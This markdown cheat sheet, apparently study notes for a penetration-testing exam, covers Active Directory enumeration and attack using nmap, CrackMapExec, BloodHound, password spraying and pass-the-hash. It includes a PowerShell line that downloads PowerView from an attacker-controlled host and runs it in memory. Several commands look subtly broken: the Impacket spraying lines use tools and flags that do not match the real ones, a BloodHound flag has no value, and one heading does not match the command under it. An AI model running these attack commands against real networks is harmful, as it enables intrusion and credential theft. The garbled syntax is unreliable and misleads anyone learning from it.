# 🛰️ AD Enumeration Research

> [!ABSTRACT] Overview of AD Enumeration Techniques
>
> This document outlines various techniques and tools used for Active Directory (AD) enumeration during cybersecurity assessments.

---

## 🔍 Initial Assessment Workflow

```text
445 Open?
   ↓
Enumerate Shares & Users
   ↓
Check Null/Guest Access
   ↓
Extract User Information
   ↓
Password Spraying
   ↓
Admin Privilege Escalation
```

---

# 📂 Enumerating AD Domains and Forests

## Nmap

```bash
sudo nmap -p445 --script smb-protocols <IP>
```

### Gather Domain Information Using CrackMapExec (CME)

List domain users:

```bash
crackmapexec smb <IP> -u . -d . --users
```

---

# 🔍 Querying AD Users and Groups

## Enumerating Users & Groups with CME

```bash
crackmapexec smb <IP> -u users.txt -p pass.txt --groups
```

### Using BloodHound for Graphical Enumeration of AD Relationships

Install BloodHound:

```text
sudo pip install bloodhound
```

Run a BloodHound collection agent:

```text
bloodhound --collection quick -d --dc <DC_IP> --username <USERNAME> --password <PASSWORD>
```

# 🧩 Extracting Sensitive Information from AD

## Searching for Configuration Files and Credentials

### Hunting for Configurations and Sensitive Data with PowerView

Invoke-PsExec:

```text
powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1'); Invoke-UserHunter"
```

---

# 🔑 Password Spraying Attacks

### Using Impacket for Password Spraying

Basic password spraying:

```bash
impacket-smbpasswd -uspray <IP> username:password
```

Using a list of usernames and passwords:

```bash
impacket-runas -usersfile users.txt -passfile pass.txt <DOMAIN>/<USER>
```

---

# 🎭 Pass-the-Hash (PtH)

### Authenticating with NTLM Hashes

Authenticate using NTLM hashes:

```bash
crackmapexec smb <IP> -u user -H NTHASH
```

# ⚠️ Potential Exploits and Common Findings

| Finding | Impact |
|---|---|
| Null Session Access | User Enumeration |
| Guest Account Enabled | Data Exposure |
| Writable Shares | Malware Dropping/Lateral Movement |
| Local Admin Credentials | System Shell Access |

> [!WARNING] 
> Be cautious with destructive actions and ensure that testing is done in a controlled environment.

---

# 🧠 Exam Mental Model

```text
AD Open
 ├─ Users?
 │   ├─ Enumerate → Collect Creds
 │   └─ Password Spraying? → Admin Access
 ├─ Null Session? → Enumerate Domain Info
 ├─ Credentials? → Use for Priv Esc
 ├─ Hashes? → Pass-the-Hash
```

> [!SUCCESS] AD Enumeration Rule of Thumb
>
> Whenever you see port 445 open, think:
>
> ```text
> Users → Passwords → Admin Access → Lateral Movement
> ```
>
> Most AD compromises involve SMB and Kerberos protocols for enumeration, credential validation, lateral movement, and remote command execution.
